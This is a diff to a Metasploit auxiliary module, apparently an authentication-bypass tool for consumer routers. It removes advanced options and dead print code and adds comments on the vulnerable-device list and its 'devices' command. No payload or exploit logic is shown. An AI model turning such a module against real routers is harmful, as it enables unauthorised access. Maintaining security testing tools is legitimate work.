@@ -41,15 +41,6 @@ class MetasploitModule < Msf::Auxiliary
             OptInt.new('device',[true, 'ID of device from list of vulnerable devices'])
         ], Exploit::Remote::HttpClient
     )
-
-    register_advanced_options(
-        [
-            #OptString.new('COOKIE_NUMBER',[false, 'Value used in cookie e.g. 107373883']),
-            #OptInt.new('COOKIE_OFFSET',[false, 'Value of offset in cookie']),
-            OptString.new('CANARY_URI', [false, 'Try overwriting the requested URI with this canary value (empty for random)']),
-            OptString.new('STATUS_CODES_REGEX', [true, 'Ensure that canary pages and probe responses have status codes that match this regex', '^40[134]$'])
-        ], self.class
-    )
   end
 
   def headers
@@ -58,6 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     }
   end
 
+  # List of known values and models, couldn't find better solution how to store them
   def devices_list
     [
         {:name=> 'Azmoon', :model=>'AZ-D140W', :fw=>'2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1', :number=> 107367693,
@@ -238,6 +230,7 @@ class MetasploitModule < Msf::Auxiliary
     { "devices" => "List known vulnerable devices" }
   end
 
+  # Command for listing all devivces with known values, for bypass to work
   def cmd_devices(*args)
     tbl =	Msf::Ui::Console::Table.new(
         Msf::Ui::Console::Table::Style::Default,
@@ -259,12 +252,6 @@ class MetasploitModule < Msf::Auxiliary
       counter += 1
     end
     print tbl.to_s
-    #print_status("ID\tName")
-
-    #for device in devices_list
-    #  print_status(counter.to_s + ":\t" + device[:name])
-    #  counter += 1
-    #end
   end
 
   def run
